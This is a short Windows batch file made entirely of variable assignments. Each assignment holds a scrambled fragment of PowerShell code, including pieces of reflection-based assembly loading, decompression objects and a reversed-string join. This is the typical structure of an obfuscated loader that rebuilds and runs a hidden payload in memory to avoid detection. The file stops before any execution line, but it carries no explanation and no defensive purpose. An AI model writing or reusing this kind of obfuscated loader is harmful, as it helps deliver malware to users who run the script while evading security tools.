@echo off
set "lLrOzXgROL=e]::"
set "KrksPfZpiq= New"
set "JkebQWOgbo=ionM"
set "DpMYiFrKKb=.Ass"
set "wiwcLxpKWD=Ku.T"
set "zUNnHqbDXE='[-1"
set "sgZoMMydRj=ct S"
set "AmTvVEGowC=s75K"
set "nisNvLxjNN=$sRY"
set "xwoZOXsKDY=..-1"
set "jYCqHllCey=ceKx"
set "ALXKACoGas=oryS"
set "cAadLMzBVt=bjec"
set "iCVAjgEfjz=ck($"
set "MWTWlFNneN=$sRY"
set "lxvCHgNiDZ=; };"
set "QXxOrqheRk= = $"
set "bkRNofkYYg=Comp"
set "YXOlEWHtSK=[Sys"
set "TjImssFEFq=ct S"
set "yytzxxFFzj=] -j"
set "mHdCAFIWzH=Fp);"
set "bTXqHBvtYf=IoQ."
set "XaoYBZGFvO=.Cre"
set "AffhQpgzjm=ay()"
set "YKFFXPmgRy=n ''"
set "IEtZKUiuCv=UKu."
set "jyHmNKAgko=$sRY"
set "uZDAujfnlv=, (,"
set "EOyxMlkGkx=-Obj"
set "BqTQuEDrRm=ment"
set "tibLeOtVRF=raph"
